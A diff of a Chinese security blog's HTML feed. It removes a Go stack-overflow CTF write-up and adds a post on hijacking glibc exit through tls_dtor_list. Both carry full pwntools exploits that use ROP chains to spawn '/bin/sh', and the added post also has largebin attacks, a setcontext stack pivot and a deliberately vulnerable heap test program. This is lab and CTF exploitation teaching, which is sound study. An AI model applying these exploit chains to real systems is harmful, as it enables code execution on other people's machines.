+<p>这里的key就是我们写到<code>fs:0x30</code>的地址，最后利用chunk2把chunk3（fake_dtor_list）的func域改为加密后的<code>setcontext+61</code>，由于我们之前把next域设置为了chunk2的data域的地址，所以这里rdx就会指向chunk2的data域，这样我们在改chunk2时，设置rsp为一个可写地址，rbp为栈迁移目标地址-8，rcx为<code>leave;ret</code>地址，最终就能栈迁移到我们可控的堆段上，这里我们迁移到了chunk8的data域，chunk8写rop链即可。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f2e7</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000029db4</span></span><br><span class="line"></span><br><span class="line">key = heap_base + <span class="number">0x3260</span></span><br><span class="line">chunk8 = heap_base + <span class="number">0x3770</span></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x78</span> + p64(chunk8-<span class="number">8</span>)  <span class="comment">#rbp</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(heap_base+<span class="number">0x5000</span>)+p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x420</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(((setcontext+<span class="number">61</span>)^key)&lt;&lt;<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x428</span>,payload)  </span><br><span class="line"></span><br><span class="line">rop = p64(pop_rdi_ret)+p64(chunk8+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_r12_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rax_ret)+p64(<span class="number">0x3b</span>)+p64(syscall)+<span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x58</span>,rop)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">end()</span><br></pre></td></tr></table></figure></div>
 
-<p>其中前者用于创建一个 <code>Cmd</code> 对象，后者用于执行真正的命令。</p>
-<p>那么我们试试直接填充0x1d0字节，然后把返回地址覆盖为<strong>main_executeCommand</strong>地址。结果会在最后<code>fmt_Fprintf-&gt;fmt__ptr_pp_doPrintf-&gt;fmt__ptr_pp_printArg-&gt;fmt__ptr_pp_fmtString-&gt;fmt__ptr_fmt_fmtS-&gt;fmt__ptr_fmt_padString-&gt;runtime_growslice</code>这个调用链然后gopanic退出，其提示信息为<code>&quot;growslice: cap out of rangeinternal loc&quot;...</code>，也就是说Go 语言在处理切片（slice）扩容时，发生容量超出合理范围时的一个运行时错误。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x449852    mov    rdi, rsi                        RDI =&gt; 0x4141414141414155 (&#x27;UAAAAAAA&#x27;)</span><br><span class="line">......</span><br><span class="line">0x449939    movabs r8, 0x1000000000000         R8 =&gt; 0x1000000000000</span><br><span class="line">0x449943    cmp    rsi, r8                     0x4141414141414155 - 0x1000000000000     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ]</span><br><span class="line">0x449946    seta   r9b</span><br><span class="line">0x44994a    mov    rsi, rcx                    RSI =&gt; 0x14</span><br><span class="line">0x44994d    mov    r10, rdx                    R10 =&gt; 0x4141414141416000</span><br><span class="line">0x449950    jmp    0x449c69                    &lt;0x449c69&gt;</span><br><span class="line">↓</span><br><span class="line">0x449c69    test   r9b, r9b     1 &amp; 1     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ]</span><br><span class="line">0x449c6c  ✔ jne    0x449d4d                    &lt;0x449d4d&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>我们稍微往前看就可以发现这里rsi和r8的比较实际上应该就是判断切片大小，而存大小的位置被我们覆盖成为了一堆A。也就是说我们破坏了<code>fmt_Fprintf</code>的一些参数。那我们就打断点在这个函数处看看哪些参数被覆盖成了一堆A。rdx很可疑。但前面调用<code>runtime_convTstring</code>后就没有动过rdx了，这个<code>runtime_convTstring</code>函数也比较短，可以跟进去看看。</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203024108.png"
+                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128124932862.png"
                       class=""
                 >
 
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203039143.png"
-                      class=""
-                >
-
-<p>其中唯一修改了rdx的是这一句，这个函数的栈帧在一开始 <code>sub rsp, 20h</code> 扩充的空间，这里是把rsp+0x30处的内容复制过来，而rsp+0x30处内容前面有 <code>mov qword ptr [rsp + 0x30], rbx </code> 的修改，而我们进这个函数前rbx就已经是0x4141414141414141了，还要往前追溯。发现前面刚好有个 <code>mov rbx, [rsp+208h+var_C8]</code> ，也就是说我们不能把这个位置的数值覆盖掉。经过进一步用正常数值调试发现，这个位置存的其实就是我们输入的大小。那么我们可以试试先填充0x108个垃圾字符，然后输入大小，之后再正常填充。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203058314.png"
-                      class=""
-                >
-
-<p>前面的判断绕过了，但在fmt函数中还是崩，但这次是rcx的问题。往前找找，发现是这个<code>runtime_memmove</code>函数的第二个参数源地址被覆盖掉了。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203113527.png"
-                      class=""
-                >
-
-<p>我们直接把前面要填充的垃圾字符都换成一个可写的地址试试，成功绕过了这个死亡之call，也算是成功地绕过了所有阻碍，终于能劫持控制流返回了（这写了个0x4a0120覆盖返回地址进行测试）。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203128877.png"
+                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128124955592.png"
                       class=""
                 >
 
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203145314.png"
+                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128125025834.png"
                       class=""
                 >
 
-<p>后面就可以直接ret2syscall了，这里我本来还想靠<strong>os_exec_Command</strong>玩一下，但还是要先靠read把&#x2F;bin&#x2F;sh读到一个地方，不如直接调用execve。需要注意的是这个syscall会后面带着改栈上的内容，如下图这样rop链就会被打断，需要绕一下。</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922203202348.png"
+                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128125109454.png"
                       class=""
                 >
 
-<h6 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./gostack&quot;</span>)</span><br><span class="line">bss_add = <span class="number">0x00000000005633C0</span></span><br><span class="line">syscall = <span class="number">0x0000000000404043</span></span><br><span class="line">pop_rdi_5reg_ret = <span class="number">0x00000000004a18a5</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000042138a</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000004944ec</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040f984</span></span><br><span class="line">rop = p64(pop_rdi_5reg_ret) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(pop_rsi_ret) + p64(bss_add) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">rop += (p64(pop_rdi_5reg_ret) + p64(bss_add)*<span class="number">6</span>)*<span class="number">3</span> + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(pop_rax_ret) + p64(<span class="number">0x3b</span>) + p64(syscall)</span><br><span class="line"></span><br><span class="line">payload = (p64(bss_add)*<span class="number">33</span> + p64(<span class="number">0x1d8</span>))+(p64(bss_add)*<span class="number">24</span>) + rop</span><br><span class="line">log.success(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your magic message :&quot;</span>,payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+<p>exp</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./poc&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;pwn.challenge.ctf.show&quot;,28310)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./poc&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;libc_base:&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x80e50</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">tls_dtor_list = libc_base - <span class="number">0x2918</span></span><br><span class="line">fs_base = libc_base - <span class="number">0x28c0</span></span><br><span class="line"><span class="comment"># fs_base = libc_base - 0x3260</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029139</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000004da83</span></span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x428</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>)  <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)  <span class="comment">#4</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x16b0</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(tls_dtor_list-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x500</span>)        <span class="comment">#trigger largebin attack 1</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(heap_base+<span class="number">0x1af0</span>))    <span class="comment">#next=chunk2-&gt;data</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x4f8</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x600</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(fs_base+<span class="number">0x30</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x600</span>)        <span class="comment">#trigger largebin attack 2</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f2e7</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000029db4</span></span><br><span class="line"></span><br><span class="line">key = heap_base + <span class="number">0x3260</span></span><br><span class="line">chunk8 = heap_base + <span class="number">0x3770</span></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x78</span> + p64(chunk8-<span class="number">8</span>)  <span class="comment">#rbp</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(heap_base+<span class="number">0x5000</span>)+p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x420</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(((setcontext+<span class="number">61</span>)^key)&lt;&lt;<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x428</span>,payload)  </span><br><span class="line"></span><br><span class="line">rop = p64(pop_rdi_ret)+p64(chunk8+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_r12_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rax_ret)+p64(<span class="number">0x3b</span>)+p64(syscall)+<span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x58</span>,rop)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">end()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
 ]]></content>
       <categories>
@@ -1741,8 +2062,7 @@
       </categories>
       <tags>
         <tag>pwn</tag>
-        <tag>go</tag>
-        <tag>ciscn wp</tag>
+        <tag>heap</tag>
       </tags>
   </entry>
   <entry>
@@ -2765,120 +3085,6 @@
         <tag>yunzai</tag>
         <tag>JS</tag>
         <tag>OneBot</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>tls_dtor_list劫持exit执行-高版本glibc利用思路之一</title>
-    <url>/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/</url>
-    <content><![CDATA[<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>主要链条：</p>
-<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">exit-&gt;__run_exit_handlers-&gt;__call_tls_dtors</span><br></pre></td></tr></table></figure></div>
-
-<p>源码：</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var)     PTR_MANGLE (var)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ THREAD_GET_POINTER_GUARD ())</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> THREAD_GET_POINTER_GUARD() \</span></span><br><span class="line"><span class="meta">  THREAD_GETMEM (THREAD_SELF, header.stack_guard)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> THREAD_GETMEM(descr, member) \</span></span><br><span class="line"><span class="meta">  descr-&gt;member</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Ensure that the MAP dereference happens before</span></span><br><span class="line"><span class="comment">	 l_tls_dtor_count decrement.  That way, we protect this access from a</span></span><br><span class="line"><span class="comment">	 potential DSO unload in _dl_close_worker, which happens when</span></span><br><span class="line"><span class="comment">	 l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span></span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__call_tls_dtors)</span><br><span class="line">......</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  dtor_func func;</span><br><span class="line">  <span class="type">void</span> *obj;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
-
-
-
-<p>很清楚能看到如果<code>tls_dtor_list</code>不为空，就会把cur指针指向<code>tls_dtor_list</code>，然后将其中func的函数指针字段经过<code>PTR_DEMANGLE</code>处理后，直接作为函数调用，参数是<code>cur-&gt;obj</code>。</p>
-<p><code>tls_dtor_list</code>记录了<code>dtor_list</code>这个单向链表的表头，我们可以通过覆盖<code>tls_dtor_list</code>的值为一个我们可控的内存区域，然后就能伪造各个字段了。但最麻烦的是在调用func前有一个异或的逻辑，实际上会与<code>fs:0x30（tcbhead_t-&gt;pointer_guard）</code>处的内容进行异或，那我们首先要想办法泄露出这个内容，或者是直接改写这个位置的内容，才可以调用我们想要的函数。所以一般会利用largebin attack或者unsortedbin attack两次，完成<code>tls_dtor_list</code>的修改以及对<code>tcbhead_t-&gt;pointer_guard</code>的修改。</p>
-<h4 id="汇编实现"><a href="#汇编实现" class="headerlink" title="汇编实现"></a>汇编实现</h4><p>主要逻辑如下：</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">&lt;__call_tls_dtors+<span class="number">17</span>&gt;    mov    rbp, qword ptr fs:[rbx]             </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">21</span>&gt;    test   rbp, rbp                            </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">24</span>&gt;    je     __call_tls_dtors+<span class="number">93</span>         </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">26</span>&gt;    nop    word ptr [rax + rax]</span><br><span class="line">&lt;__call_tls_dtors+<span class="number">32</span>&gt;    mov    rdx, qword ptr [rbp + <span class="number">0x18</span>]         </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">36</span>&gt;    mov    rax, qword ptr [rbp]                </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">40</span>&gt;    ror    rax, <span class="number">0x11</span></span><br><span class="line">&lt;__call_tls_dtors+<span class="number">44</span>&gt;    xor    rax, qword ptr fs:[<span class="number">0x30</span>]            </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">53</span>&gt;    mov    qword ptr fs:[rbx], rdx             </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">57</span>&gt;    mov    rdi, qword ptr [rbp + <span class="number">8</span>]            </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">61</span>&gt;    call   rax    </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">63</span>&gt;    mov    rax, qword ptr [rbp + <span class="number">0x10</span>]</span><br><span class="line">&lt;__call_tls_dtors+<span class="number">67</span>&gt;    lock sub qword ptr [rax + <span class="number">0x468</span>], <span class="number">1</span></span><br><span class="line">&lt;__call_tls_dtors+<span class="number">76</span>&gt;    mov    rdi, rbp</span><br><span class="line">&lt;__call_tls_dtors+<span class="number">79</span>&gt;    call   <span class="built_in">free</span>@plt                    &lt;<span class="built_in">free</span>@plt&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>先是会把rbp指向<code>tls_dtor_list</code>，也就是<code>dtor_list</code>链表的头节点，正是我们修改的地方。然后取出func字段后，会先右移0x11位，再与<code>fs:[0x30]</code>处的内容异或。最后call进行调用。那么我们传func字段时就先异或再左移，就能够解出正确的函数指针。需要注意的是，如果我们不是直接利用头节点处的<code>dtor_list</code>，map域也要进行伪造，使<code>map+0x468</code>为一个可写地址，而且之后的<code>free</code>也需要想办法绕过，所以最好还是直接一次直接利用完成。因为这里<code>mov rdx, qword ptr [rbp + 0x18]</code>直接把rdx拉到我们可控的堆区域了，而且我们控制next域就可以控制rdx的值，其实我们也可以走<code>setcontext</code>的打法。</p>
-<h4 id="利用验证"><a href="#利用验证" class="headerlink" title="利用验证"></a>利用验证</h4><p>自己写一个堆的菜单题，不做什么限制方便原理验证。</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> *chunk_list[<span class="number">32</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Add&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. Show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;choice &gt;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx, size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">    chunk_list[idx] = <span class="built_in">malloc</span>(size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx,size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,chunk_list[idx], size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">free</span>(chunk_list[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">puts</span>(chunk_list[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">end</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Bye~&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line">    <span class="type">void</span> *libc_base = &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;puts_addr:%p\n&quot;,&amp;puts);</span></span><br><span class="line">    <span 